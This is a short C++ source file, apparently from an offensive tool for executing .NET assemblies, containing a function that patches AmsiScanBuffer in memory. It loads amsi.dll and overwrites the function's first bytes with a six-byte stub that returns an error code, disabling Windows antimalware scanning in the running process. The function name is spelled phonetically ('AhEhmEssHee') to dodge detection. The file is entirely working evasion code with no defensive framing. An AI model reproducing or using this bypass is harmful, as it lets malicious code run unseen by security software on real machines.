#include "ExecAssembly.h"

void PatchAhEhmEssHeeScanBuffer()
{
    HMODULE amsiDllHandle = ::LoadLibraryW(L"amsi.dll");
    FARPROC addr = ::GetProcAddress(amsiDllHandle, "AmsiScanBuffer");

    // https://rastamouse.me/blog/asb-bypass-pt3/
    char patch[6] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

    HANDLE processHandle = ::GetCurrentProcess();

    ::WriteProcessMemory(processHandle, addr, (PVOID)patch, (SIZE_T)6, (SIZE_T*)nullptr);
}
